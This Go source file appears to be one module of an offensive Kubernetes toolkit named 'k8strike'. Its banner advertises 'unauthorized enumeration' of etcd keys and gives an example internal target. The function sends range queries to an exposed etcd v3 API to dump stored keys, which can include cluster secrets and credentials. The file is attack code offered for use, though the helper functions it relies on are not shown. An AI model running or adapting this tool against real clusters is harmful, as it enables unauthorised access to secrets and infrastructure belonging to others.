package etcdctl

import (
	"fmt"
	"net/url"
	"strings"
)

var ectlBanner = `ectl - Unauthorized enumeration of ectd keys.

Usage:
  ./k8strike tool ectl <endpoint> get <key>

Example: 
  ./k8strike tool ectl http://172.16.5.4:2379 get /
`

func EtcdctlToolApi(args []string) {
	var opt = EtcdRequestOption{}
	if len(args) != 3 {
		fmt.Println(ectlBanner)
		return
	}
	u, err := url.Parse(args[0])
	if err != nil {
		fmt.Println(ectlBanner)
		return
	}
	opt.Endpoint = fmt.Sprintf("%s://%s", u.Scheme, u.Host)
	opt.Api = u.Path

	switch strings.ToUpper(args[1]) {
	case "GET":
		opt.Api = "/v3/kv/range"
		opt.Method = "POST"
		opt.PostData = GenerateQuery(args[2])
		resp, err := DoRequest(opt)
		if err != nil {
			fmt.Println(err)
			return
		}
		GetKeys(resp, false)
	default:
		fmt.Println(ectlBanner)
		return
	}
}
